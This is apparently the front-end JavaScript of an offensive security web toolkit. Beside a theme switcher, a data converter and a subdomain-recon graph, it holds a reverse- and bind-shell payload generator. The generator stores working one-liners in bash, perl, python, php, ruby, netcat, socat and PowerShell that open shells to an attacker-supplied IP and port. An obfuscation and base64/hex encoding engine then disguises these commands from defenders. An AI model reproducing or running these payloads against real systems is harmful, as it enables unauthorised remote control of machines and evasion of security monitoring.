document.addEventListener('DOMContentLoaded', () => {
    const initApp = () => {
        initDisclaimer();
        initThemeSwitcher();
        initCoreUI();
        initThoughtBubbles();
        initPayloadGenerator();
        initDataConverter();
        initChimera();
    };

    // ... (initDisclaimer, initThemeSwitcher, initCoreUI, initThoughtBubbles are unchanged) ...
    const initDisclaimer = () => {
        const modal = document.getElementById('disclaimer-modal');
        const acceptBtn = document.getElementById('accept-disclaimer');
        if (sessionStorage.getItem('disclaimerAccepted') === 'true') {
            modal.classList.remove('active');
            return;
        }
        acceptBtn.addEventListener('click', () => {
            sessionStorage.setItem('disclaimerAccepted', 'true');
            modal.classList.remove('active');
        });
    };

    const initThemeSwitcher = () => {
        const themeButtons = document.querySelectorAll('.theme-btn');
        const body = document.body;
        const themeMeta = document.querySelector('meta[name="theme-color"]');
        const applyTheme = (theme) => {
            body.className = '';
            if (theme !== 'default') {
                body.classList.add(`theme-${theme}`);
            }
            localStorage.setItem('grtt-theme', theme);
            const newBgColor = getComputedStyle(body).getPropertyValue('--bg-color');
            if (themeMeta) {
                themeMeta.setAttribute('content', newBgColor.trim());
            }
        };
        themeButtons.forEach(button => {
            button.addEventListener('click', () => {
                applyTheme(button.dataset.theme);
            });
        });
        const savedTheme = localStorage.getItem('grtt-theme') || 'default';
        applyTheme(savedTheme);
    };

    const initCoreUI = () => {
        const navLinks = document.querySelectorAll('.nav-link[data-module]');
        const modules = document.querySelectorAll('.module-container');
        const settingsTrigger = document.getElementById('settings-trigger');
        const settingsModal = document.getElementById('theme-modal');
        const closeModalButton = document.getElementById('close-theme-modal');
        navLinks.forEach(link => {
            link.addEventListener('click', (e) => {
                e.preventDefault();
                const targetModuleId = link.getAttribute('data-module');
                navLinks.forEach(l => l.classList.remove('active'));
                link.classList.add('active');
                modules.forEach(m => m.classList.toggle('active', m.id === `${targetModuleId}-module`));
            });
        });
        const toggleSettingsModal = (isActive) => settingsModal.classList.toggle('active', isActive);
        settingsTrigger.addEventListener('click', (e) => { e.preventDefault(); toggleSettingsModal(true); });
        closeModalButton.addEventListener('click', () => toggleSettingsModal(false));
    };

    const initThoughtBubbles = () => {
        const bubble = document.querySelector('.thought-bubble');
        const bubbleText = document.getElementById('bubble-text');
        const thoughts = [ "Did I leave nmap running?", "Shodan is my treasure map.", "That's not a bug, it's a feature.", "sudo !! is my favorite spell.", "A C2 is a pirate's best friend.", "Why use a key when a lockpick will do?", "I'm not lost, I'm pivoting.", "Yarr, there be shells here!", "Is the firewall made of swiss cheese?", "Never trust a default password." ];
        const showThought = () => {
            const randomThought = thoughts[Math.floor(Math.random() * thoughts.length)];
            bubbleText.textContent = randomThought;
            bubble.classList.add('active');
            setTimeout(() => bubble.classList.remove('active'), 5000);
        };
        setTimeout(() => { showThought(); setInterval(showThought, 15000); }, 2000);
    };

    const initPayloadGenerator = () => {
        const ipAddressEl = document.getElementById('ipAddress');
        const portEl = document.getElementById('port');
        const shellTypeEl = document.getElementById('shellType');
        const osTypeEl = document.getElementById('osType');
        const payloadTypeEl = document.getElementById('payloadType');
        const outputCodeEl = document.getElementById('outputCode');
        const listenerCommandEl = document.getElementById('listenerCommand');
        const copyButton = document.getElementById('copyButton');
        const obfuscateCaseEl = document.getElementById('obfuscateCase');
        const obfuscateQuotesEl = document.getElementById('obfuscateQuotes');
        const obfuscateCaretsEl = document.getElementById('obfuscateCarets');
        const encodingTypeEl = document.getElementById('encodingType');

        const payloadMap = {
            reverse: {
                linux: {
                    bash: 'bash -i >& /dev/tcp/{ip}/{port} 0>&1',
                    perl: `perl -e 'use Socket;$i="{ip}";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};`,
                    python: `python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'`,
                    php: `php -r '$sock=fsockopen("{ip}",{port});exec("/bin/sh -i <&3 >&3 2>&3");`,
                    ruby: `ruby -rsocket -e'f=TCPSocket.open("{ip}",{port}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'`,
                    netcat: `nc -e /bin/sh {ip} {port}`,
                },
                windows: {
                    powershell: `powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`
                }
            },
            bind: {
                linux: {
                    netcat: 'nc -lvnp {port} -e /bin/bash',
                    socat: 'socat TCP-LISTEN:{port},fork EXEC:/bin/bash'
                },
                windows: {
                    powershell: `$p=New-Object Net.Sockets.TcpListener('0.0.0.0',{port});$p.Start();$c=$p.AcceptTcpClient();$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$o=(iex $d 2>&1|Out-String);$ob=([text.encoding]::ASCII).GetBytes($o+'PS '+(pwd).Path+'> ');$s.Write($ob,0,$ob.Length);$s.Flush()};$c.Close();$p.Stop()`
                }
            }
        };

        const listenerMap = {
            reverse: {
                linux: 'nc -lvnp {port}',
                windows: 'nc -lvnp {port}'
            },
            bind: {
                linux: 'nc {ip} {port}',
                windows: 'nc {ip} {port}'
            }
        };

        const populatePayloads = () => {
            const os = osTypeEl.value;
            const shellType = shellTypeEl.value;
            payloadTypeEl.innerHTML = '';
            const payloads = payloadMap[shellType]?.[os] || {};
            Object.keys(payloads).forEach(p => {
                const option = document.createElement('option');
                option.value = p;
                option.textContent = p.charAt(0).toUpperCase() + p.slice(1);
                payloadTypeEl.appendChild(option);
            });
            generatePayload();
        };

        const generatePayload = () => {
            const ip = ipAddressEl.value;
            const port = portEl.value;
            const os = osTypeEl.value;
            const shellType = shellTypeEl.value;
            const payload = payloadTypeEl.value;

            if (!payloadMap[shellType] || !payloadMap[shellType][os] || !payloadMap[shellType][os][payload]) {
                outputCodeEl.textContent = 'Payload not available for this configuration.';
                listenerCommandEl.textContent = 'Listener not available.';
                return;
            }

            let command = payloadMap[shellType][os][payload].replace(/{ip}/g, ip).replace(/{port}/g, port);

            // Obfuscation Engine
            if (obfuscateCaseEl.checked) {
                command = command.split('').map(c => Math.random() > 0.5 ? c.toUpperCase() : c.toLowerCase()).join('');
            }
            if (obfuscateQuotesEl.checked && os === 'linux') { // Simple string splitting for bash
                command = command.replace(/"(.*?)"/g, (match, p1) => p1.split(' ').map(s => `"${s}"`).join(' '));
            }
            if (obfuscateCaretsEl.checked && os === 'windows') { // PowerShell caret insertion
                command = command.replace(/\s/g, '^');
            }

            // Encoding Engine
            const encoding = encodingTypeEl.value;
            if (encoding === 'base64') {
                const encoded = btoa(command);
                if (os === 'linux') {
                    command = `echo ${encoded} | base64 -d | bash`;
                } else if (os === 'windows') {
                    command = `powershell -e ${encoded}`;
                }
            } else if (encoding === 'hex') {
                const hex = command.split('').map(c => c.charCodeAt(0).toString(16)).join('');
                if (os === 'linux') {
                    command = `echo ${hex} | xxd -r -p | bash`;
                }
            }

            outputCodeEl.textContent = command;
            listenerCommandEl.textContent = listenerMap[shellType]?.[os]?.replace('{port}', port).replace('{ip}', ip) || 'Listener not available.';
        };

        copyButton.addEventListener('click', () => {
            navigator.clipboard.writeText(outputCodeEl.textContent).then(() => {
                copyButton.innerHTML = '<i class="fa-solid fa-check"></i> Copied!';
                setTimeout(() => {
                    copyButton.innerHTML = '<i class="fa-solid fa-copy"></i> Copy Payload';
                }, 2000);
            });
        });

        [ipAddressEl, portEl, shellTypeEl, osTypeEl, payloadTypeEl, obfuscateCaseEl, obfuscateQuotesEl, obfuscateCaretsEl, encodingTypeEl].forEach(el => {
            el.addEventListener('change', generatePayload);
            el.addEventListener('input', generatePayload); // For text inputs
        });

        populatePayloads();
    };

    const initDataConverter = () => {
        const inputEl = document.getElementById('converterInput');
        const outputEl = document.getElementById('converterOutput');
        const opButtons = document.querySelectorAll('#data-converter-module button[data-op]');
        const swapButton = document.getElementById('swapButton');

        const operations = {
            'b64-encode': (input) => btoa(input),
            'b64-decode': (input) => {
                try { return atob(input); } catch (e) { return 'Invalid Base64'; }
            },
            'url-encode': (input) => encodeURIComponent(input),
            'url-decode': (input) => {
                try { return decodeURIComponent(input); } catch (e) { return 'Invalid URL Encoding'; }
            },
            'jwt-debug': (input) => {
                try {
                    const [header, payload, signature] = input.split('.');
                    if (!header || !payload || !signature) return "Invalid JWT structure.";
                    const decodedHeader = JSON.stringify(JSON.parse(atob(header.replace(/-/g, '+').replace(/_/g, '/'))), null, 2);
                    const decodedPayload = JSON.stringify(JSON.parse(atob(payload.replace(/-/g, '+').replace(/_/g, '/'))), null, 2);
                    return `Header:\n${decodedHeader}\n\nPayload:\n${decodedPayload}\n\nSignature:\n${signature}`;
                } catch (e) {
                    return "Invalid JWT Token";
                }
            },
            'hash': async (algo, input) => {
                const encoder = new TextEncoder();
                const data = encoder.encode(input);
                const hashBuffer = await crypto.subtle.digest(algo, data);
                const hashArray = Array.from(new Uint8Array(hashBuffer));
                return hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
            }
        };

        opButtons.forEach(button => {
            button.addEventListener('click', async () => {
                const op = button.getAttribute('data-op');
                const inputText = inputEl.value;
                if (!inputText) return;
                try {
                    let result = '';
                    const hashOps = { 'sha1': 'SHA-1', 'sha256': 'SHA-256', 'sha512': 'SHA-512' };
                    if (op in hashOps) {
                        result = await operations.hash(hashOps[op], inputText);
                    } else if (op in operations) {
                        result = operations[op](inputText);
                    }
                    outputEl.value = result;
                } catch (e) {
                    outputEl.value = `Error: ${e.message}`;
                }
            });
        });

        swapButton.addEventListener('click', () => {
            [inputEl.value, outputEl.value] = [outputEl.value, inputEl.value];
        });
    };

    const initChimera = () => {
        const domainInput = document.getElementById('reconDomainInput');
        const scanButton = document.getElementById('reconScanButton');
        const progressContainer = document.getElementById('chimera-progress-container');
        const progressBar = document.getElementById('chimera-progress-bar');
        const progressText = document.getElementById('chimera-progress-text');
        const graphContainer = document.getElementById('chimera-graph');
        const sidebar = document.getElementById('chimera-sidebar');
        const closeSidebarBtn = document.getElementById('close-sidebar-btn');
        const sidebarTitle = document.getElementById('sidebar-title');
        const sidebarContent = document.getElementById('sidebar-content');

        let network = null;

        const toggleLoading = (isLoading, message = '') => {
            scanButton.disabled = isLoading;
            progressContainer.classList.toggle('d-none', !isLoading);
            if(isLoading) {
                progressText.textContent = message;
                const fill = progressBar.querySelector('.chimera-progress-fill');
                if(fill) fill.style.width = '0%';
            }
        };

        const updateProgress = (percentage, message) => {
            const fill = progressBar.querySelector('.chimera-progress-fill');
            if(fill) fill.style.width = `${percentage}%`;
            progressText.textContent = message;
        };

        const renderGraph = (nodes, edges) => {
            const data = { nodes: new vis.DataSet(nodes), edges: new vis.DataSet(edges) };
            const options = {
                nodes: {
                    shape: 'dot',
                    size: 16,
                    font: { color: '#e6edf3', size: 14 },
                    borderWidth: 2
                },
                edges: {
                    width: 2,
                    color: { inherit: 'from' },
                    smooth: { type: 'continuous' }
                },
                physics: {
                    barnesHut: { gravitationalConstant: -30000 },
                    stabilization: { iterations: 2500 }
                },
                interaction: {
                    tooltipDelay: 200,
                    hideEdgesOnDrag: true
                }
            };
            network = new vis.Network(graphContainer, data, options);

            network.on('click', (params) => {
                if (params.nodes.length > 0) {
                    const nodeId = params.nodes[0];
                    const nodeData = data.nodes.get(nodeId);
                    updateSidebar(nodeData.details);
                }
            });
        };

        const updateSidebar = (details) => {
            sidebarTitle.textContent = details.subdomain;
            let contentHTML = `<p><strong>Open Ports:</strong> ${details.openPorts.join(', ') || 'None detected'}</p>`;
            if (details.vtResults) {
                contentHTML += '<p><strong>VirusTotal:</strong></p>';
                contentHTML += `<pre>Malicious: ${details.vtResults.malicious}\nSuspicious: ${details.vtResults.suspicious}\nHarmless: ${details.vtResults.harmless}\nUndetected: ${details.vtResults.undetected}</pre>`;
            }
            if (details.screenshotUrl) {
                contentHTML += `<img src="${details.screenshotUrl}" alt="Screenshot of ${details.subdomain}">`;
            }
            sidebarContent.innerHTML = contentHTML;
            sidebar.classList.add('active');
        };

        closeSidebarBtn.addEventListener('click', () => sidebar.classList.remove('active'));

        scanButton.addEventListener('click', async () => {
            const domain = domainInput.value.trim();
            if (!domain) return;
            
            toggleLoading(true, 'Initializing scan...');
            graphContainer.innerHTML = '';
            sidebar.classList.remove('active');

            try {
                updateProgress(10, `Fetching subdomains for ${domain}...`);
                const response = await fetch(`/api/scan?domain=${encodeURIComponent(domain)}`);
                const data = await response.json();

                if (!response.ok) {
                    throw new Error(data.error || `API Error: ${response.statusText}`);
                }

                updateProgress(50, 'Building attack surface graph...');

                const rootNode = { id: domain, label: domain, color: '#00f5c3', size: 30, details: { subdomain: domain, openPorts: [], vtResults: null, screenshotUrl: null } };
                const nodes = [rootNode];
                const edges = [];

                data.nodes.forEach(node => {
                    let color = '#1e88e5'; // Default blue
                    if (node.openPorts.length > 0) color = '#fdd835'; // Yellow for open ports
                    if (node.vtResults && node.vtResults.malicious > 0) color = '#e53935'; // Red for malicious

                    nodes.push({ id: node.subdomain, label: node.subdomain, color: color, details: node });
                    edges.push({ from: domain, to: node.subdomain });
                });

                renderGraph(nodes, edges);
                updateProgress(100, 'Scan complete!');
                setTimeout(() => toggleLoading(false), 1000);

            } catch (error) {
                toggleLoading(false);
                graphContainer.innerHTML = `<div class="module-panel" style="text-align:center;padding:20px;"><h5>Error</h5><p>${error.message}</p></div>`;
            }
        });
    };

    initApp();
});
